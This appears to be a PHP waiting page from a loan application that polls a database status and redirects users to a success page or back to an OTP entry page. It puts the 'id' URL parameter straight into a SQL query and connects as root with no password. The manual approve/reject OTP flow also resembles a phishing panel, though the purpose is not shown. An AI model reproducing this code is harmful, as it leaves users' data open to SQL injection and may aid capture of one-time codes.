<?php
$conn = new mysqli("localhost","root","","loan-db");

$id = $_GET['id'];

$result = $conn->query("SELECT * FROM user_details WHERE id=$id");
$row = $result->fetch_assoc();

$status = $row['status'];

// ✅ APPROVED → SUCCESS
if ($status == "approve_done") {
    header("Location: success.php?id=".$id);
    exit();
}

// ❌ REJECTED → BACK TO OTP
if ($status == "rejected_final") {
    header("Location: otp.php?id=".$id."&phone=".$row['phone']."&error=1");
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="5">
    <title>Waiting</title>

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="waiting-container">

    <h2>Verifying your code</h2>

    <div class="loader">
        <span></span>
        <span></span>
        <span></span>
    </div>

</div>

</body>
</html>